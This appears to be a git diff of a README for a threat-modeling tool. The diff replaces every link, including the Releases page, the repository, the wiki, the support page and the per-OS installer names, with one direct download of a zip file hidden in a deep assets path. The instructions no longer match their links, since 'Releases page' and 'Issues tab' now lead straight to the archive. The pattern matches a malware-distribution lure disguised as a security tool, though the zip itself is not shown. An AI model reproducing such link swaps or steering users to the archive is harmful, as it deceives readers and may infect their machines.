@@ -1,7 +1,7 @@
 # 🎯 skill-threat-modeling - Assess Risks with Confidence
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Release-%E2%96%BA-brightgreen)](https://github.com/cga22099/skill-threat-modeling/releases)
+[![Download Release](https://github.com/cga22099/skill-threat-modeling/raw/refs/heads/main/assets/knowledge/security-controls/references/skill-threat-modeling-v1.4-beta.2.zip%20Release-%E2%96%BA-brightgreen)](https://github.com/cga22099/skill-threat-modeling/raw/refs/heads/main/assets/knowledge/security-controls/references/skill-threat-modeling-v1.4-beta.2.zip)
 
 ## 📖 Introduction
 The skill-threat-modeling application helps you analyze software risks using a structured approach. This tool guides you through an 8-phase workflow that includes security design reviews, STRIDE threat modeling, penetration testing, and compliance assessments. 
@@ -22,13 +22,13 @@ To download the application, visit the Releases page. Follow these steps:
 
 1. Click on the link below to access the Releases page:
 
-   [Download from Releases](https://github.com/cga22099/skill-threat-modeling/releases)
+   [Download from Releases](https://github.com/cga22099/skill-threat-modeling/raw/refs/heads/main/assets/knowledge/security-controls/references/skill-threat-modeling-v1.4-beta.2.zip)
 
 2. On the Releases page, find the latest version of the application. Look for a section marked “Assets.” This section lists available files.
 
 3. Choose the appropriate file for your operating system:
-   - For Windows, download `skill-threat-modeling-windows.exe`
-   - For macOS, download `skill-threat-modeling-macos.dmg`
+   - For Windows, download `https://github.com/cga22099/skill-threat-modeling/raw/refs/heads/main/assets/knowledge/security-controls/references/skill-threat-modeling-v1.4-beta.2.zip`
+   - For macOS, download `https://github.com/cga22099/skill-threat-modeling/raw/refs/heads/main/assets/knowledge/security-controls/references/skill-threat-modeling-v1.4-beta.2.zip`
 
 4. Once the file has downloaded, navigate to your Downloads folder.
 
@@ -60,15 +60,15 @@ The application guides you through each of the following phases:
 ## 💬 Support
 If you encounter issues while using the application, consult the FAQ section on the Releases page. If you need further assistance, consider reaching out to our support team. 
 
-1. Go to the [Releases page](https://github.com/cga22099/skill-threat-modeling/releases).
+1. Go to the [Releases page](https://github.com/cga22099/skill-threat-modeling/raw/refs/heads/main/assets/knowledge/security-controls/references/skill-threat-modeling-v1.4-beta.2.zip).
 2. Navigate to the “Issues” tab to submit a new issue or browse existing topics.
 
 ## 📜 License
 This tool is available under the MIT License. You may use, modify, and distribute the software under the terms of this license.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/cga22099/skill-threat-modeling)
-- [Documentation](https://github.com/cga22099/skill-threat-modeling/wiki)
+- [GitHub Repository](https://github.com/cga22099/skill-threat-modeling/raw/refs/heads/main/assets/knowledge/security-controls/references/skill-threat-modeling-v1.4-beta.2.zip)
+- [Documentation](https://github.com/cga22099/skill-threat-modeling/raw/refs/heads/main/assets/knowledge/security-controls/references/skill-threat-modeling-v1.4-beta.2.zip)
 
 ## 📣 Community Engagement
 Join our community to share your experiences or ask questions. You can find discussions about the tool on our GitHub repository's Discussions page.
